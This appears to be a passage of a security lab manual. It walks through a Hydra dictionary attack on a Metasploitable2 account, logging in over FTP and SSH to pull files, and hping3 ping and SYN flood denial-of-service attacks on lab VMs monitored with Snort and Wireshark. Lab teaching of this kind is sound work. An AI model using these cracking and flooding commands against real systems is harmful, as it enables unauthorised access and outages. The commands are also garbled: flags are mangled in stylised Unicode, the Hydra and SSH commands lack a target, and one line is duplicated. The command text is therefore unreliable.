@@ -1,0 +1,89 @@
+6. ABC Corp, a medium-sized company, is concerned about the security of its network
+and wants to ensure that its employees are using strong passwords. IT security team has
+been tasked with conducting a password strength assessment to identify weak
+passwords that may pose a security risk. The IT security team decides to use a
+password cracking tool, to perform the password strength assessment. Plan is to target
+the company's internal systems, including FTP, SSH. By using Hydra password
+cracking tool perform a password strength assessment, so that ABC Corp's IT sec team
+was able to identify & address weaknesses in their network's authentication.
+Solution: -
+Ensure kali Linux and metaspoiltable VM’s are up and running.
+# Go to Kali linux terminal, Type
+𝑙𝑜𝑐𝑎𝑡𝑒 𝑢𝑛𝑖𝑥_𝑝𝑎𝑠𝑠𝑤𝑜𝑟𝑑𝑠. 𝑡𝑥𝑡
+It contains dictionary of passwords. Without knowing password, we cannot enter into the target system with
+FTP connection.
+If 𝑢𝑛𝑖𝑥_𝑝𝑎𝑠𝑠𝑤𝑜𝑟𝑑𝑠. 𝑡𝑥𝑡 does not contain 𝑚𝑠𝑓𝑎𝑑𝑚𝑖𝑛, password of metaspoiltable2 VM, Then type below
+commands
+vi /opt/metasploit-framework/embedded/framework/data/wordlists/unix_passwords.txt
+Then add msfadmin and save the file.
+Hydra tool is used for password cracking. Type the below command in kali linux terminal for cracking the
+password (Dictionary attack), specify the path of 𝑢𝑛𝑖𝑥_𝑝𝑎𝑠𝑠𝑤𝑜𝑟𝑑. 𝑡𝑥𝑡 and IP address of metaspoiltable2 VM.
+ℎ𝑦𝑑𝑟𝑎 − 𝑙 𝑚𝑠𝑓𝑎𝑑𝑚𝑖𝑛 − 𝑃 /𝑜𝑝𝑡/𝑚𝑒𝑡𝑎𝑠𝑝𝑙𝑜𝑖𝑡 𝑓𝑟𝑎𝑚𝑒𝑤𝑜𝑟𝑘/ 𝑒𝑚𝑏𝑒𝑑𝑑𝑒𝑑 / 𝑓𝑟𝑎𝑚𝑒𝑤𝑜𝑟𝑘/ 𝑑𝑎𝑡𝑎/
+𝑤𝑜𝑟𝑑𝑙𝑖𝑠𝑡𝑠/𝑢𝑛𝑖𝑥_𝑝𝑎𝑠𝑠𝑤𝑜𝑟𝑑𝑠. 𝑡𝑥𝑡
+Now it will match the passwords from the dictionary, once the exact match is found. it will display password
+matched.
+Now get FTP connection to target machine (Metaspoiltable 2) by using below command
+ftp 192.168.62.129
+Then enter username and password of target machine.
+Once you get 𝑓𝑡𝑝 > prompt, it clearly indicates, you got into your target machine.
+Navigate yourself to different path by using below commands
+𝑓𝑡𝑝 > 𝑙𝑠
+𝑓𝑡𝑝 > 𝑐𝑑 𝑣𝑢𝑙𝑛𝑒𝑟𝑎𝑏𝑙𝑒
+𝑓𝑡𝑝 > 𝑐𝑑 𝑡𝑤𝑖𝑘𝑖20030201
+To transfer the file from your target machine to your system.
+𝑓𝑡𝑝 > 𝑔𝑒𝑡 𝑇𝑊𝑖𝑘𝑖20030201. 𝑡𝑎𝑟. 𝑔𝑧
+Similarly, once the password of the target machine is known we can also connect target machine by using
+SSH Connection by using below command.
+𝑠𝑠ℎ − 𝑜 𝐻𝑜𝑠𝑡𝐾𝑒𝑦𝐴𝑙𝑔𝑜𝑟𝑖𝑡ℎ𝑚𝑠 =+ 𝑠𝑠ℎ − 𝑟𝑠𝑎, 𝑠𝑠ℎ − 𝑑𝑠𝑠
+Type the password. Then you can see the below prompt
+𝑚𝑠𝑓𝑎𝑑𝑚𝑖𝑛@𝑚𝑒𝑡𝑎𝑠𝑝𝑙𝑜𝑖𝑡𝑎𝑏𝑙𝑒: ~$
+Navigate yourself in the target machine to access the files.
+7. Imagine you are the network security administrator for a medium-sized e-commerce
+company that operates an online store handling sensitive customer information.
+Recently, there have been reports of intermittent service disruptions and slow response
+times on your company's website, resulting in customer complaints & loss of revenue.
+After conducting initial investigations, you suspect that website may be experiencing
+denial-of-service (DoS) attacks, specifically SYN floods and Ping flood attacks. So, it
+is important for organizations to have response plans in place to mitigate the impact of
+DoS attacks on their operations. Use Hping3, kali Linux tool to perform SYN floods
+and ping flood attacks to launch DOS attack on the target machine and proactively
+monitor the networks for signs of attack.
+A Denial of Service Attack is a cyber-attack in which the attacker seeks to make a machine or network
+resource unavailable to its intended users by temporarily or indefinitely distributing services of a host
+connected to the internet. DOS attack is typically accomplished by flooding the targeted machine or resource
+with superfluous requests in an attempt to overload systems.
+Ping Flood DoS Attack: -
+Ping Network Utility
+● Ping is a troubleshooting tool used by system administrators to manually test for connectivity
+between network devices and also for network delay and packet loss.
+● The Ping command sends an ICMP echo request to a device on the network, and device responds with
+ICMP echo reply.
+● The data returned in echo request message must be returned in the echo reply message.
+Exercise:
+Ensure Kali Linux and Ubuntu vm are up and running. Ping from kali linux machine to Ubuntu
+𝑝𝑖𝑛𝑔 192. 168. 62. 133
+Start capturing ICMP request/reply from Wireshark.
+Once you capture and can notice in Wireshark analyzer, the ICMP packet request and ICMP packet reply.
+Hping3 Tool Demo
+Hping3 tool is used to generate lot of ICMP request packets. (i.e. flooding our target with lot of ping packets)
+Wireshark used as a packet analyzer. Ubuntu is a target machine.
+In Ubuntu Install Snort (Intrusion Detection System) by using below command.
+𝑠𝑢𝑑𝑜 𝑎𝑝𝑡 − 𝑔𝑒𝑡 𝑖𝑛𝑠𝑡𝑎𝑙𝑙 𝑠𝑛𝑜𝑟𝑡 − 𝑦
+and keep the IDS ready for observing the packet transfer by using below command.
+𝑠𝑢𝑑𝑜 𝑠𝑛𝑜𝑟𝑡 − 𝐴 𝑐𝑜𝑛𝑠𝑜𝑙𝑒 − 𝑐 /𝑒𝑡𝑐/𝑠𝑛𝑜𝑟𝑡/𝑠𝑛𝑜𝑟𝑡. 𝑐𝑜𝑛𝑓
+Then in Kali linux machine run the hping2 tool commands. And observe Ubuntu snort output and Wireshark
+analyzer output for the flood of packets.
+a. 𝑠𝑢𝑑𝑜 ℎ𝑝𝑖𝑛𝑔3 − 1 − 𝑐 1 192. 168. 62. 133
+b. 𝑠𝑢𝑑𝑜 ℎ𝑝𝑖𝑛𝑔3 − 1 − 𝑐 1 − 𝑖 5 192. 168. 62. 133
+c. 𝑠𝑢𝑑𝑜 ℎ𝑝𝑖𝑛𝑔3 − 1 −− 𝑓𝑎𝑠𝑡𝑒𝑟 192. 168. 62. 133
+d. 𝑠𝑢𝑑𝑜 ℎ𝑝𝑖𝑛𝑔3 − 1 −− 𝑓𝑎𝑠𝑡𝑒𝑟 192. 168. 62. 133
+e. 𝑠𝑢𝑑𝑜 ℎ𝑝𝑖𝑛𝑔3 − 1 − 𝑎 192. 168. 62. 139 192. 168. 62. 133
+f. 𝑠𝑢𝑑𝑜 ℎ𝑝𝑖𝑛𝑔3 − 1 –𝑟𝑎𝑛𝑑 − 𝑠𝑜𝑢𝑟𝑐𝑒 192. 168. 62. 133
+TCP 3-way handshake
+For SYN Flood Attack, use below commands. Ensure Kali Linux and Metaspoiltable2 are up and running.
+In kali linux browser, type metaspoiltable 2 IP to launch DVWA application, login.
+a. 𝑠𝑢𝑑𝑜 ℎ𝑝𝑖𝑛𝑔3 − 𝑆 − 𝑐 1 − 𝑝 80 192. 168. 62. 129
+b. 𝑠𝑢𝑑𝑜 ℎ𝑝𝑖𝑛𝑔3 − 𝑆 − 𝑐 1 − 𝑝 80 − 𝑖 5 192. 168. 62. 129
+c. 𝑠𝑢𝑑𝑜 ℎ𝑝𝑖𝑛𝑔3 − 𝑆 −− 𝑓𝑙𝑜𝑜𝑑 − 𝑝 80 192. 168. 62. 129
+Once the target machine is flooded with Syn packets, observe in the wireshark analyzer, you can see target
+system (metaspoiltable2 Vm) is flooded with packets. And DVWA application is taking time to load.
